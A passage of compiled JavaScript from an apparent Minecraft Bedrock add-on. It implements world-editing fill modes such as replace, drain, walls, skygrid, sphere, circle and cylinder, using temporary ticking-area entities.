                                    ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                    system.runTimeout(() => { try {
                                        let startTime = Date.now();
                                        if (replacemode) {
                                            clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                        }
                                        ;
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        ta?.remove();
                                    } }, 2);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "replace":
                                system.run(() => {
                                    let ta;
                                    try {
                                        let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                        player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                                        ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea");
                                        system.runTimeout(() => {
                                            try {
                                                let startTime = Date.now();
                                                if (replacemode) {
                                                    clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                                }
                                                ;
                                                let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                                let endTime = Date.now();
                                                player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                            }
                                            catch (e) {
                                                eventData.sender.sendMessage("§c" + e + e.stack);
                                            }
                                            finally {
                                                ta?.remove();
                                            }
                                        }, 2);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                });
                                break;
                            case "clear":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        if (replacemode) {
                                            clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                        }
                                        ;
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, "air");
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "drain":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, "air", undefined, { matchingBlock: "water" });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "fill":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        if (replacemode) {
                                            clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                        }
                                        ;
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "keep":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: "air" });
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "walls":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHW(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "hollow":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "outline":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHO(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "pillars":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHP(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] }, undefined, replacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "skygrid":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        fillBlocksHSGG(coordinatesa, coordinatesb, sgskygridsize, player.dimension, sgfirstblockname, sgfirstblockstates, { matchingBlock: sgmatchingblock[0], matchingBlockStates: sgmatchingblock[1], minMSBetweenYields: 5000 }, undefined, sgreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "inverseskygrid":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        fillBlocksHISGG(coordinatesa, coordinatesb, sgskygridsize, player.dimension, sgfirstblockname, sgfirstblockstates, { matchingBlock: sgmatchingblock[0], matchingBlockStates: sgmatchingblock[1], minMSBetweenYields: 5000 }, undefined, sgreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "tunnel":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "floor":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "ceilling":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "diamond":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "hollowovoid":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        fillBlocksHHOG(center, vTV3(Vector.subtract(horadi, { x: -0.5, y: -0.5, z: -0.5 })), hooffset, hothickness, player.dimension, hofirstblockname, hofirstblockstates, { matchingBlock: homatchingblock[0], matchingBlockStates: homatchingblock[1], minMSBetweenYields: 5000 }, undefined, horeplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "ovoid":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        fillBlocksHOG(center, vTV3(Vector.subtract(oradi, { x: -0.5, y: -0.5, z: -0.5 })), ooffset, player.dimension, ofirstblockname, ofirstblockstates, { matchingBlock: omatchingblock[0], matchingBlockStates: omatchingblock[1], minMSBetweenYields: 5000 }, undefined, oreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "hollowsphere":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        fillBlocksHHSG(center, radius - 0.5, thickness, player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1], minMSBetweenYields: 5000 }, undefined, hsreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "dome":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        fillBlocksHDG(center, radius - 0.5, thickness, player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1], minMSBetweenYields: 5000 }, undefined, hsreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}${a.completionData.containsUnloadedChunks ? "; Some blocks were not generated because they were in unloaded chunks. " : ""}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "sphere":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        fillBlocksHSG(center, radius - 0.5, player.dimension, ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1], minMSBetweenYields: 5000 }, undefined, ccreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "semisphere":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        fillBlocksHSSG(center, radius - 0.5, player.dimension, ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1], minMSBetweenYields: 5000 }, undefined, ccreplacemode, 100).then(a => { player.sendMessage(`${a.counter == 0 ? "§c" : ""}${a.counter} blocks filled in ${a.completionData.endTime - a.completionData.startTime} ms over ${a.completionData.endTick - a.completionData.startTick} tick${(a.completionData.endTick - a.completionData.startTick) == 1 ? "" : "s"}`); }, (e) => { eventData.sender.sendMessage("§c" + e + e.stack); });
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circle":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, axis, cfirstblockname, cfirstblockstates, { matchingBlock: cmatchingblock[0], matchingBlockStates: cmatchingblock[1] }, undefined, creplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlex":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "x", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circley":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "y", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlez":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "z", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlexy":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "xy", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circleyz":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "yz", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlexz":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "xz", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlexyz":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHC(center, radius, player.dimension, "xyz", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinder":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, taxis, player.dimension, tfirstblockname, tfirstblockstates, { matchingBlock: tmatchingblock[0], matchingBlockStates: tmatchingblock[1] }, undefined, treplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderx":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "x", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylindery":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "y", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderz":
                                system.run(() => { let ta; try {
                                    generateTickingAreaFillCoordinatesC(player.location, (() => { let a = new CompoundBlockVolume(); a.pushVolume({ volume: new BlockVolume(coordinatesa, coordinatesb) }); return a; })(), player.dimension).then(tac => { ta = tac; try {
                                        let startTime = Date.now();
                                        let a = fillBlocksHT(center, radius, thickness, "z", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                        let endTime = Date.now();
                                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                    }
                                    catch (e) {
                                        eventData.sender.sendMessage("§c" + e + e.stack);
                                    }
                                    finally {
                                        tac.forEach(tab => tab?.remove());
                                    } });
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderxy":
                                system.run(() => { let ta; try {
